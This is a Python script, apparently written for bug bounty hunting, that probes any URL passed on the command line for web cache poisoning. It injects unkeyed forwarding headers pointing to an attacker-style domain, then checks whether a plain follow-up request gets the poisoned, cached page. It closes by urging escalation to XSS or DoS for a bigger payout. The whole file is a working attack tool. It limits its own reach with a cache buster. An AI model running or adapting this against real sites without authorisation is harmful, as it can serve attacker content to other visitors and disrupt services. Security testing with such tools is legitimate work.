import requests
import sys
import random
import time

def scan_cache_poisoning(url):
    print(f"\n[*] Bhai, starting Web Cache Poisoning Scan on: {url}")
    
    # THE CACHE BUSTER:
    # Hum URL ke aage '?cb=1234' jaisa random number lagate hain.
    # Isse hum main website ka cache kharab nahi karenge, sirf apni test file banayenge.
    cb = random.randint(10000, 99999)
    target_url = f"{url}?cb={cb}"
    print(f"[*] Generated Cache Buster URL: {target_url}\n")
    print("--------------------------------------------------")

    # The Hacker's Poison (Unkeyed Headers)
    evil_domain = "evil-archsammi-hacker.com"
    poison_headers = {
        'X-Forwarded-Host': evil_domain,
        'X-Host': evil_domain,
        'X-Forwarded-Server': evil_domain,
        'User-Agent': 'Mozilla/5.0 (X11; Arch Linux x86_64)'
    }

    print("[*] Step 1: Injecting malicious unkeyed headers to poison the cache...")
    
    try:
        # Request 1: Poisoning the Cache
        requests.get(target_url, headers=poison_headers, timeout=10)
        
        # Thoda wait karte hain taaki cache save ho jaye
        time.sleep(2)
        
        print("[*] Step 2: Accessing the page as a NORMAL user (Without poison headers)...")
        # Request 2: Normal user (Victim) bankar check karna
        normal_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        victim_response = requests.get(target_url, headers=normal_headers, timeout=10)
        
        print("\n[*] Analyzing the Victim's Response...")
        
        # Checking if our evil domain was reflected to the innocent user
        if evil_domain in victim_response.text:
            print("   [!] BINGO 🎯 EVIL DOMAIN IS REFLECTED IN THE PAGE!")
            
            # Now, check if it came from the CACHE
            cache_headers = ['X-Cache', 'CF-Cache-Status', 'X-Varnish', 'Age']
            is_cached = False
            
            for ch in cache_headers:
                if ch in victim_response.headers:
                    val = victim_response.headers[ch].upper()
                    if "HIT" in val or ch == 'Age':
                        is_cached = True
                        print(f"   [+] CACHE VERIFIED via header -> {ch}: {val}")
            
            if is_cached:
                print("\n   [!!!] JACKPOT 🎯 CRITICAL WEB CACHE POISONING FOUND!")
                print("   [!!!] Impact: Any user visiting this page will load your malicious payload!")
                print("   [!!!] Bug Bounty: Escalate to XSS or DoS for maximum payout.")
            else:
                print("\n   [?] Weird: Domain reflected, but Cache headers don't say 'HIT'. Manual check needed.")
                
        else:
            print("\n[-] Server is secure. Unkeyed headers were ignored or not cached.")

    except requests.exceptions.RequestException as e:
        print(f"\n[-] Arre yaar, connection failed/timeout: {e}")

    print("--------------------------------------------------")
    print("[+] Cache Poisoning Scan Complete, Bhai!")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 cache_poisoner.py <target_url>")
        print("Example: python3 cache_poisoner.py http://testphp.vulnweb.com")
        sys.exit(1)
        
    # Ensure URL formatting
    target = sys.argv[1]
    if not target.startswith("http"):
        target = "http://" + target
        
    scan_cache_poisoning(target)
